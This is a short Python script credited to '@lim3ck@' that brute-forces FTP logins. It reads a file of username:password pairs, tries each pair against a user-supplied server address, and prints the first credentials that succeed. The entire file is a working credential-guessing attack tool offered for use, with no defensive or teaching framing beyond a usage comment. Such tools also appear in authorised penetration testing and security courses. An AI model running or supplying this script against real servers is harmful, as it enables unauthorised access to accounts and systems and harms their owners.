#!/usr/bin/python3.9

# Made by @lim3ck@
# FTP server Brute force login.
# The userPassword file must have the following format -> Username:Pasword
# e.g: Enter the IP address: 192.168.0.100
#      Enter the user:password File path: ftppass.txt

import ftplib
from termcolor import colored



def bruteLogin(hostname, passwFile):
    try:
        pFile= open(passwFile,"r")
    except:
        print(colored(" [!!] File doesn't exist! ","red"))
        return 0
    for line in pFile.readlines():
        username = line.split(":")[0].strip("\n")
        password = line.split(":")[1].strip("\n")
        print(colored("     [*] Trying: "+ username + "/" + password,"yellow"))
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(username,password)
            print(colored("     [*] Login Suceeded with: "+ username + "/" + password,"green"))
            ftp.quit()
            return True
        except Exception:
            pass
    print(colored(" [!!] Password not in list","red"))



host = input(" Enter the IP address: ")
passwFile = input(" Enter the user:password File path: ")

bruteLogin(host,passwFile)
